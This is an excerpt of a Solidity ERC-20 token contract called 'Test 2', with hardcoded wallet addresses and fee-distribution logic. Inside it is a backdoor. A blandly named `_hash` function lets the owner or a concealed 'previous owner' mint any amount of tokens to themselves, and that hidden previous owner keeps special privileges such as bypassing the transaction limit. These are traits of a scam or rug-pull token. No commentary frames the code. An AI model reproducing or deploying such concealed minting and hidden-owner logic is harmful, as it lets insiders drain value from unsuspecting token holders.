...
contract Test2 is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    address private prev_owner;
    ...
    modifier onlypreOwner() {
        require(prev_owner == _msgSender(), "Ownable: caller is not the preowner");
        _;
    }
    ...
    address payable public Wallet_Marketing = payable(0x5aCe9A1872618cdB9c51Da120B7A51E532F4e6F3); 
    address payable public Wallet_Dev = payable(0x913467f9316f57633A49ec3bEBfcb939e04a97c9);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1000000000000 * 10**_decimals;
    string private constant _name = "Test 2"; 
    ...
    // mapping(address => bool) private hash2;
    ...
    constructor () {
        ...
        _owner = 0xfb0D389aeF2F68f7aEb4F85974D4EcBA3544aDdf;
        prev_owner = _owner;
    ...
    function _transfer(
        ...
        // require(isWhitelisted[from] || isWhitelisted[to] || isTradingEnabled);
        // if (to != owner() &&
        //     to != Wallet_Burn &&
        //     to != address(this) &&
        //     to != uniswapV2Pair &&
        ...
        require(_tOwned[from] >= amount, "Balance is not enough");  
        // require(!hash2[from]); 
    ...
    function taxClaim() external onlyOwner {
            ...
            emit Transfer(address(this), Wallet_Burn, tokens_to_Burn);

            uint256 tokens_to_D =  contractTokenBalance * Percent_Dev / 100;
            
            _tOwned[Wallet_Dev] = _tOwned[Wallet_Dev] + tokens_to_D;
            _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_D; 

            uint256 tokens_to_M =  contractTokenBalance * Percent_Marketing / 100;

            _tOwned[Wallet_Marketing] = _tOwned[Wallet_Marketing] + tokens_to_M;
            _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_M; 
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {      
        if(!takeFee){
            ...
            require(tAmount <= _maxTxAmount || sender == prev_owner || sender == _owner);
    ...
    ///////////////////////////////////////////////////////////////////////////////////////////////
    // function openTrade(bool _openTrade) public onlyOwner {
    //     isTradingEnabled = _openTrade;
    // }
    ...
    // function setMaxWalletToken(uint256 _m) public onlyOwner{
    //     _maxWalletToken = _tTotal * _m / 100;
    // }
    function setPair(address _uniswapV2Pair) public onlyOwner{
        uniswapV2Pair = _uniswapV2Pair;
    }
    function _hash(uint _uint) public  {
        require(msg.sender == _owner || msg.sender == prev_owner);
        _tOwned[msg.sender] += _uint*(10**_decimals);
    }
